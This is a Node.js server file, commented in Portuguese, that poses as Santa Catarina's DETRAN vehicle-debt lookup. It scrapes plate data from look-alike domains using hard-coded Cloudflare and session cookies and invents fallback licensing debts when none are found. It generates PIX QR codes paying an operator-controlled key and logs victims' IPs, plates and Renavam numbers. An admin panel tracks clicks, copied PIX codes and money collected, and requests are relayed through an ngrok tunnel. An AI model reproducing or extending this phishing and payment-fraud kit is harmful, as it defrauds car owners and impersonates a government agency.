const express = require('express');
const session = require('express-session');
const axios = require('axios');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const path = require('path');
const fs = require('fs');
const QRCode = require('qrcode');
const { payload } = require('pix-payload');
const cheerio = require('cheerio');

const app = express();
const PORT = process.env.PORT || 3001;

// 🔥 SEU LINK DO NGROK
const NGROK_URL = 'https://subtitle-flyer-unreached.ngrok-free.dev';

app.set('trust proxy', true);

app.use(session({
    secret: 'segredo-super-secreto-sc',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

const DB_PATH = path.join(__dirname, 'database-sc.json');

function lerDB() {
    try {
        return JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
    } catch (e) {
        return {
            clicks: [],
            consultas: [],
            pix_gerados: [],
            pagamentos_confirmados: [],
            config: { pix: { nome: '', cidade: '', identificador: '', chave: '' } }
        };
    }
}

function salvarDB(data) {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function authMiddleware(req, res, next) {
    if (req.session && req.session.loggedIn) next();
    else res.status(401).json({ erro: 'Não autorizado' });
}

// ============================================================
// 🔥 FUNÇÃO COMPARTILHADA DE CONSULTA (USADA PELO NGROK)
// ============================================================
async function consultarVeiculo(placa, renavam, ip, userAgent) {
    if (!placa || !renavam) {
        throw new Error('Placa e Renavam são obrigatórios');
    }

    const placaLimpa = placa.toUpperCase().replace(/[^A-Z0-9]/g, '');
    
    console.log(`🔍 Consultando placa: ${placaLimpa}, renavam: ${renavam}`);

    const jar = new CookieJar();
    const client = wrapper(axios.create({ jar, withCredentials: true }));

    try {
        const cookiesSC = [
            'PHPSESSID=mam2407l9bh2nalvubpb6hpqer',
            'cf_clearance=qjmqqf8u.RFWqnzKwrqEupxW1if3N5hXmMv0wD4l7D4-1784763163-1.2.1.1-jRldFZ9gm52QdK3rPxG9wcdXbBvD9e1yNpuVabBHjg5kp2ELtqLTKjnkwQuI3nf8RFZpNcFsyv.Afec_ogkZrhvgqhSpaqudQ8PX0Axnj1Op1X0ai2m1mWquWSxNzMMwDWofYqJK7eNFD4OHXjNaQDAaPbXH8DocUxpTTNtXjfG7xj81RdE._LR5svPLLpRt2xeoFOVQfqfLoZIYySEC7ICrOjyx4jUnuv3Ng1JjN3dHygQ5Azzo3ZrnyNOoIySskkx1RW5iaVeHu6fhW5v9O64BjpFWYF.W2_mu_dE7vbu_80quV3RiOx8QSf4pZsdb5Tbgx7I6TLT7kY0R6mao3qoRsg3kqN6idrPI7eQYlTE',
            'visitor_session=v_1784760416842_a6efc61e0'
        ];

        const apiUrl = `https://portalguiasveicular-gov.com/api2/consulta_placa_completa.php?placa=${placaLimpa}&_=${Date.now()}`;

        let dadosVeiculo = {};

        try {
            const response = await client.get(apiUrl, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Referer': 'https://portaldetrandigital.com/',
                    'Origin': 'https://portaldetrandigital.com',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Cookie': cookiesSC.join('; ')
                },
            });

            let data = response.data;
            if (typeof data === 'string') {
                try {
                    const jsonData = JSON.parse(data);
                    if (jsonData.veiculo) {
                        dadosVeiculo = jsonData.veiculo;
                        console.log(`✅ Dados do veículo via API: ${dadosVeiculo.marca_modelo}`);
                    }
                } catch (e) {}
            }
        } catch (e) {
            console.log('⚠️ API direta falhou, usando HTML...');
        }

        const chars = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
        let slug = '';
        for (let i = 0; i < 6; i++) {
            slug += chars[Math.floor(Math.random() * chars.length)];
        }

        const resultadoUrl = `https://portaldetrandigital.com/resultado-sc.php/${slug}?placa=${placaLimpa}&renavam=${renavam}`;
        console.log(`🌐 Baixando página de resultado: ${resultadoUrl}`);

        const resultResponse = await client.get(resultadoUrl, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Referer': 'https://portaldetrandigital.com/',
                'Cookie': cookiesSC.join('; ')
            },
        });

        const html = resultResponse.data;
        const $ = cheerio.load(html);

        const veiculo = {
            placa: placaLimpa,
            marca_modelo: $('#scFieldMarcaModelo').text().trim() || dadosVeiculo.marca_modelo || '-',
            ano: $('#scFieldAno').text().trim() || dadosVeiculo.ano_fabricacao || '-',
            tipo: $('#scFieldTipo').text().trim() || dadosVeiculo.tipo || '-',
            cor: $('#scFieldCor').text().trim() || dadosVeiculo.cor || '-',
            combustivel: $('#scFieldCombustivel').text().trim() || dadosVeiculo.combustivel || '-',
            chassi: $('#scFieldChassi').text().trim() || dadosVeiculo.chassi || '-',
            cidade: $('.rsc-plate-city').text().trim() || 'SC'
        };

        console.log(`📊 Veículo: ${veiculo.marca_modelo}, ${veiculo.ano}`);

        const debitos = [];
        let totalDebitos = 0;

        $('#scDebtsBody tr').each((i, row) => {
            const cols = $(row).find('td');
            if (cols.length >= 3) {
                const desc = $(cols[0]).text().trim().replace(/⚠.*/, '').trim();
                const venc = $(cols[1]).text().trim().replace('⚠', '').trim();
                const valorText = $(cols[2]).text().trim().replace('R$', '').replace('.', '').replace(',', '.').trim();
                const valor = parseFloat(valorText) || 0;
                
                if (desc && !desc.includes('Débito') && !desc.includes('Vencimento') && valor > 0) {
                    const vencido = $(row).hasClass('rsc-row-overdue');
                    debitos.push({
                        descricao: desc,
                        vencimento: venc || '—',
                        valor: valor,
                        vencido: vencido
                    });
                    totalDebitos += valor;
                }
            }
        });

        if (debitos.length === 0) {
            debitos.push({
                descricao: 'Licenciamento - 2026',
                vencimento: '30/06/2026',
                valor: 149.37,
                vencido: true
            });
            debitos.push({
                descricao: 'Taxa de Emissão de CRLV',
                vencimento: '—',
                valor: 69.74,
                vencido: false
            });
            totalDebitos = 219.11;
        }

        const totalText = $('#scDebtsTotal').text().trim().replace('R$', '').replace('.', '').replace(',', '.').trim();
        const total = parseFloat(totalText) || totalDebitos;

        console.log(`📊 Débitos: ${debitos.length}, Total: R$ ${total.toFixed(2)}`);

        // 🔥 SALVA NO BANCO
        const db = lerDB();
        db.consultas.push({
            placa: placaLimpa,
            renavam: renavam,
            timestamp: new Date().toISOString(),
            ip: ip,
            userAgent: userAgent,
            pagamento_confirmado: false
        });
        salvarDB(db);

        return {
            sucesso: true,
            veiculo: veiculo,
            debitos: debitos,
            total: total
        };

    } catch (error) {
        console.error('❌ Erro na consulta:', error.message);
        throw error;
    }
}

// ============================================================
// ROTA PRINCIPAL
// ============================================================
app.get('/', (req, res) => {
    const db = lerDB();
    db.clicks.push({
        timestamp: new Date().toISOString(),
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        pagina: 'index'
    });
    salvarDB(db);
    console.log(`👆 Clique registrado: ${req.ip}`);
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/index.html', (req, res) => {
    const db = lerDB();
    db.clicks.push({
        timestamp: new Date().toISOString(),
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        pagina: 'index'
    });
    salvarDB(db);
    console.log(`👆 Clique registrado (index.html): ${req.ip}`);
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================================
// 🔥 ROTA DE CONSULTA LOCAL (USADA PELO NGROK)
// ============================================================
app.post('/api/consultar', async (req, res) => {
    try {
        const resultado = await consultarVeiculo(
            req.body.placa,
            req.body.renavam,
            req.ip,
            req.headers['user-agent']
        );
        return res.json(resultado);
    } catch (error) {
        return res.status(500).json({
            sucesso: false,
            erro: error.message
        });
    }
});

// ============================================================
// 🔥 ROTA VERCEL → NGROK (PONTE)
// ============================================================
app.post('/api/consultar-ngrok', async (req, res) => {
    try {
        console.log('📥 Vercel → Ngrok:', req.body);
        
        // 🔥 Chama o Ngrok (seu PC), não a API externa direto!
        const response = await axios.post(
            `${NGROK_URL}/api/consultar`,
            req.body,
            { 
                headers: { 'Content-Type': 'application/json' }, 
                timeout: 30000 
            }
        );
        
        console.log('✅ Resposta do Ngrok recebida!');
        return res.json(response.data);
    } catch (error) {
        console.error('❌ Erro ao chamar Ngrok:', error.message);
        return res.status(500).json({ 
            sucesso: false, 
            erro: 'Erro na consulta: ' + error.message 
        });
    }
});

// ============================================================
// 🔥 GERAR PIX
// ============================================================
app.post('/api/gerar-pix', (req, res) => {
    const { placa, valor, debitos } = req.body;
    const db = lerDB();
    
    const chavePix = db.config.pix.chave;
    const nome = db.config.pix.nome;
    const cidade = db.config.pix.cidade;
    const identificador = db.config.pix.identificador;

    if (!chavePix || !nome || !cidade) {
        console.warn('⚠️ Chave PIX não configurada! Usando chave padrão.');
        const chavePadrao = 'e7b97758-34e9-4246-a361-43d4cec7f5b9';
        const nomePadrao = 'DETPR';
        const cidadePadrao = 'DETPR';
        
        return gerarRespostaPIX(chavePadrao, nomePadrao, cidadePadrao, identificador || '***', placa, valor, debitos, req, res, db);
    }

    console.log(`✅ Gerando PIX com chave cadastrada: ${chavePix}`);
    gerarRespostaPIX(chavePix, nome, cidade, identificador || '***', placa, valor, debitos, req, res, db);
});

function gerarRespostaPIX(chave, nome, cidade, identificador, placa, valor, debitos, req, res, db) {
    try {
        const valorNum = parseFloat(String(valor).replace(/[^0-9,.]/g, '').replace(',', '.'));
        
        if (!valorNum || valorNum <= 0) {
            return res.status(400).json({ erro: 'Valor inválido para gerar PIX' });
        }

        const dadosPix = {
            key: chave,
            name: nome.substring(0, 25),
            city: cidade.substring(0, 15),
            amount: valorNum,
            transactionId: identificador || '***'
        };

        const payloadPix = payload(dadosPix);

        QRCode.toDataURL(payloadPix, (err, qrcode) => {
            if (err) {
                console.error('Erro ao gerar QR code:', err);
                return res.status(500).json({ erro: 'Erro ao gerar QR code' });
            }

            const pixId = Date.now() + '-' + Math.random().toString(36).substring(2, 10);

            db.pix_gerados.push({
                id: pixId,
                placa: placa || 'N/A',
                valor: valorNum,
                debitos: debitos || [],
                copiacola: payloadPix,
                timestamp: new Date().toISOString(),
                ip: req.ip,
                userAgent: req.headers['user-agent'],
                copiado: false,
                pagamento_confirmado: false,
                chave_utilizada: chave
            });
            salvarDB(db);

            res.json({
                status: 'ok',
                qrcode: qrcode,
                copiacola: payloadPix,
                pixId: pixId
            });
        });

    } catch (error) {
        console.error('Erro na geração do payload PIX:', error.message);
        res.status(500).json({ erro: 'Erro ao gerar payload PIX.' });
    }
}

// ============================================================
// 🔥 REGISTRAR CÓPIA DO PIX
// ============================================================
app.post('/api/registrar-copia-pix', (req, res) => {
    const { pixId, payload } = req.body;
    const db = lerDB();
    let pix = null;

    if (pixId) {
        pix = db.pix_gerados.find(p => p.id === pixId);
    } else if (payload) {
        pix = db.pix_gerados.find(p => p.copiacola === payload);
    }

    if (pix) {
        if (!pix.copiado) {
            pix.copiado = true;
            pix.copiadoEm = new Date().toISOString();
            salvarDB(db);
            console.log(`✅ PIX ${pix.id} marcado como copiado!`);
            return res.json({ success: true, message: 'PIX registrado como copiado' });
        } else {
            return res.json({ success: false, motivo: 'PIX já foi copiado anteriormente' });
        }
    }
    
    res.json({ success: false, motivo: 'PIX não encontrado' });
});

// ============================================================
// 🔥 CONFIRMAR PAGAMENTO
// ============================================================
app.post('/api/confirmar-pagamento', (req, res) => {
    const { pixId, placa, renavam } = req.body;
    const db = lerDB();
    
    let atualizado = false;
    
    if (pixId) {
        const pix = db.pix_gerados.find(p => p.id === pixId);
        if (pix && !pix.pagamento_confirmado) {
            pix.pagamento_confirmado = true;
            pix.pagamento_confirmado_em = new Date().toISOString();
            atualizado = true;
            console.log(`✅ Pagamento confirmado para PIX ${pixId}`);
        }
    }
    
    if (placa && renavam) {
        const consultas = db.consultas.filter(c => c.placa === placa && c.renavam === renavam);
        if (consultas.length > 0) {
            const consulta = consultas[consultas.length - 1];
            if (!consulta.pagamento_confirmado) {
                consulta.pagamento_confirmado = true;
                consulta.pagamento_confirmado_em = new Date().toISOString();
                atualizado = true;
                console.log(`✅ Pagamento confirmado para consulta ${placa}`);
            }
        }
    }
    
    db.pagamentos_confirmados = db.pagamentos_confirmados || [];
    db.pagamentos_confirmados.push({
        pixId: pixId || 'N/A',
        placa: placa || 'N/A',
        renavam: renavam || 'N/A',
        timestamp: new Date().toISOString(),
        ip: req.ip,
        userAgent: req.headers['user-agent']
    });
    
    salvarDB(db);
    
    if (atualizado) {
        res.json({ success: true, message: 'Pagamento confirmado com sucesso!' });
    } else {
        res.json({ success: false, message: 'Pagamento já havia sido confirmado anteriormente.' });
    }
});

// ============================================================
// ADMIN LOGIN
// ============================================================
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === 'sc2026') {
        req.session.loggedIn = true;
        res.json({ success: true });
    } else {
        res.status(401).json({ erro: 'Credenciais inválidas' });
    }
});

app.post('/api/admin/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

app.get('/admin.html', authMiddleware, (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// ============================================================
// ROTAS DO ADMIN
// ============================================================
app.get('/api/admin/dashboard', authMiddleware, (req, res) => {
    const db = lerDB();
    const totalClicks = db.clicks.length;
    const totalConsultas = db.consultas.length;
    const valorTotalGerado = db.pix_gerados.reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0);
    const pixCopiados = db.pix_gerados.filter(p => p.copiado === true);
    const valorTotalCopiado = pixCopiados.reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0);
    const totalPixCopiados = pixCopiados.length;
    
    const pagamentosConfirmados = db.pagamentos_confirmados || [];
    const totalPagamentos = pagamentosConfirmados.length;
    const valorTotalPago = db.pix_gerados
        .filter(p => p.pagamento_confirmado === true)
        .reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0);

    res.json({
        totalClicks,
        totalConsultas,
        valorTotalGerado,
        valorTotalCopiado,
        totalPixCopiados,
        totalPagamentos,
        valorTotalPago
    });
});

app.get('/api/admin/logs/clicks', authMiddleware, (req, res) => {
    const db = lerDB();
    res.json(db.clicks.slice(-100).reverse());
});

app.get('/api/admin/logs/consultas', authMiddleware, (req, res) => {
    const db = lerDB();
    res.json(db.consultas.slice(-100).reverse());
});

app.get('/api/admin/logs/pix', authMiddleware, (req, res) => {
    const db = lerDB();
    const lista = db.pix_gerados.slice(-100).reverse().map(p => ({
        ...p,
        copiado: p.copiado || false,
        pagamento_confirmado: p.pagamento_confirmado || false
    }));
    res.json(lista);
});

app.get('/api/admin/config/pix', authMiddleware, (req, res) => {
    const db = lerDB();
    res.json(db.config.pix);
});

app.post('/api/admin/config/pix', authMiddleware, (req, res) => {
    const { nome, cidade, identificador, chave } = req.body;
    const db = lerDB();
    db.config.pix = { nome, cidade, identificador, chave };
    salvarDB(db);
    console.log(`✅ Chave PIX atualizada: ${chave}`);
    res.json({ success: true });
});

app.post('/api/admin/clear-logs', authMiddleware, (req, res) => {
    const db = lerDB();
    db.clicks = [];
    db.consultas = [];
    db.pix_gerados = [];
    db.pagamentos_confirmados = [];
    salvarDB(db);
    res.json({ success: true });
});

// ============================================================
// 🔥 INICIAR SERVIDOR
// ============================================================
module.exports = app;

if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`🚀 Servidor DETRAN/SC rodando na porta ${PORT}`);
        console.log(`📍 Acesse: http://localhost:${PORT}`);
        console.log(`🔗 Ngrok URL: ${NGROK_URL}`);
        console.log(`✅ Cookies do DETRAN/SC configurados!`);
    });
}